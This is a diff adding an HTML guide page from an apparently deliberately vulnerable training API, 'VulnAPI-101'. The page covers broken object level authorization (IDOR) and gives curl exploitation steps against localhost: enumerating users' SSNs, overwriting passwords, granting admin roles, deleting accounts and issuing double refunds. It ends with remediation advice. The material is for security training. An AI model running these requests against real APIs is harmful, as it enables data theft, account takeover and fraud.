@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>API1:2023 - Broken Object Level Authorization (BOLA) | VulnAPI-101</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+    <header>
+        <h1>VulnAPI-101 <span class="warning-badge">GUIDES</span></h1>
+        <p>OWASP API Top 10 Vulnerability Reference</p>
+    </header>
+
+    <nav>
+        <ul>
+            <li><a href="/static/index.html">API Testing</a></li>
+            <li><a href="/guides/">Vulnerability Guides</a></li>
+            <li><a href="/guides/by-vulnerability.html">By Vulnerability</a></li>
+            <li><a href="/guides/by-file.html">By File</a></li>
+        </ul>
+    </nav>
+
+    <main>
+        <div class="container">
+            <h2><span class="owasp-tag owasp-api1">API1:2023</span> Broken Object Level Authorization (BOLA)</h2>
+            <span class="badge badge-danger">CRITICAL SEVERITY</span>
+
+            <h3>Description</h3>
+            <p>Broken Object Level Authorization (BOLA), also known as Insecure Direct Object Reference (IDOR), occurs when an API endpoint allows access to objects by manipulating the object identifier. This happens when authorization checks are not properly implemented for object-level access.</p>
+
+            <h3>Affected Files</h3>
+            <ul>
+                <li><code>app/routes/users.py</code></li>
+                <li><code>app/routes/orders.py</code></li>
+                <li><code>app/routes/products.py</code></li>
+            </ul>
+
+            <h3>Vulnerable Endpoints</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Endpoint</th>
+                        <th>Method</th>
+                        <th>Vulnerability</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>/api/users/{id}</code></td>
+                        <td>GET, PUT, DELETE</td>
+                        <td>Access any user's data by changing ID</td>
+                    </tr>
+                    <tr>
+                        <td><code>/api/users/{id}/orders</code></td>
+                        <td>GET</td>
+                        <td>View any user's orders</td>
+                    </tr>
+                    <tr>
+                        <td><code>/api/orders/{id}</code></td>
+                        <td>GET, PUT, DELETE</td>
+                        <td>Access any order by changing ID</td>
+                    </tr>
+                    <tr>
+                        <td><code>/api/orders/{id}/refund</code></td>
+                        <td>POST</td>
+                        <td>Refund any order</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="container">
+            <h2>Exploitation Guide</h2>
+
+            <h3>1. Enumerate Users (No Auth Required)</h3>
+            <p>The API exposes all users without authentication:</p>
+            <div class="code-container">
+                <pre><code># Get all users - no authentication required!
+curl -X GET http://localhost:5000/api/users
+
+# Response includes sensitive data: passwords, SSN, credit cards</code></pre>
+            </div>
+
+            <h3>2. Access Another User's Profile</h3>
+            <p>As an authenticated user, access any other user's data by changing the ID:</p>
+            <div class="code-container">
+                <pre><code># Login as regular user
+TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "john", "password": "password123"}' | jq -r '.token')
+
+# Access admin user (ID 1) data - should be forbidden but isn't!
+curl -X GET http://localhost:5000/api/users/1 \
+  -H "Authorization: Bearer $TOKEN"
+
+# Access any user (iterate through IDs)
+for i in {1..10}; do
+  echo "=== User $i ==="
+  curl -s http://localhost:5000/api/users/$i | jq '.user.username, .user.email, .user.ssn'
+done</code></pre>
+            </div>
+
+            <h3>3. Modify Another User's Data</h3>
+            <p>Update another user's profile, including their role:</p>
+            <div class="code-container">
+                <pre><code># As user 'john', modify user 'jane' (ID 3)
+curl -X PUT http://localhost:5000/api/users/3 \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"password": "hacked123", "balance": 0}'
+
+# Privilege escalation: Make yourself admin
+curl -X PUT http://localhost:5000/api/users/2 \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"role": "admin"}'</code></pre>
+            </div>
+
+            <h3>4. Delete Another User</h3>
+            <div class="code-container">
+                <pre><code># Delete user ID 5 (test user)
+curl -X DELETE http://localhost:5000/api/users/5 \
+  -H "Authorization: Bearer $TOKEN"</code></pre>
+            </div>
+
+            <h3>5. Access Other Users' Orders</h3>
+            <div class="code-container">
+                <pre><code># View all orders without authentication
+curl -X GET http://localhost:5000/api/orders
+
+# View specific user's orders
+curl -X GET http://localhost:5000/api/users/2/orders
+
+# Access specific order
+curl -X GET http://localhost:5000/api/orders/1</code></pre>
+            </div>
+
+            <h3>6. Modify/Refund Any Order</h3>
+            <div class="code-container">
+                <pre><code># Change order status to 'delivered' without shipping
+curl -X PUT http://localhost:5000/api/orders/1 \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"status": "delivered"}'
+
+# Request refund for any order (even others')
+curl -X POST http://localhost:5000/api/orders/1/refund \
+  -H "Authorization: Bearer $TOKEN"
+
+# Double refund - no check if already refunded!
+curl -X POST http://localhost:5000/api/orders/1/refund \
+  -H "Authorization: Bearer $TOKEN"</code></pre>
+            </div>
+        </div>
+
+        <div class="container">
+            <h2>Impact</h2>
+            <ul>
+                <li><strong>Data Breach:</strong> Access to all user data including PII (SSN, credit cards)</li>
+                <li><strong>Privilege Escalation:</strong> Any user can become admin</li>
+                <li><strong>Financial Loss:</strong> Unauthorized refunds, balance manipulation</li>
+                <li><strong>Account Takeover:</strong> Modify other users' passwords</li>
+                <li><strong>Data Destruction:</strong> Delete any user account</li>
+            </ul>
+        </div>
+
+        <div class="container">
+            <h2>Remediation</h2>
+            <ol>
+                <li>Always verify the authenticated user has permission to access the requested object</li>
+                <li>Use UUIDs instead of sequential IDs to make enumeration harder</li>
+                <li>Implement proper ownership checks before any CRUD operation</li>
+                <li>Log and monitor access patterns for anomaly detection</li>
+            </ol>
+            <div class="code-container">
+                <pre><code># Secure implementation example
+@users_bp.route('/&lt;int:user_id&gt;', methods=['GET'])
+@token_required
+def get_user(user_id):
+    # ALWAYS check ownership
+    if g.current_user_id != user_id and g.current_user_role != 'admin':
+        return jsonify({'error': 'Access denied'}), 403
+
+    user = User.query.get(user_id)
+    # ... rest of implementation</code></pre>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <p>VulnAPI-101 - Educational Purposes Only | <a href="https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/">OWASP Reference</a></p>
+    </footer>
+</body>
+</html>
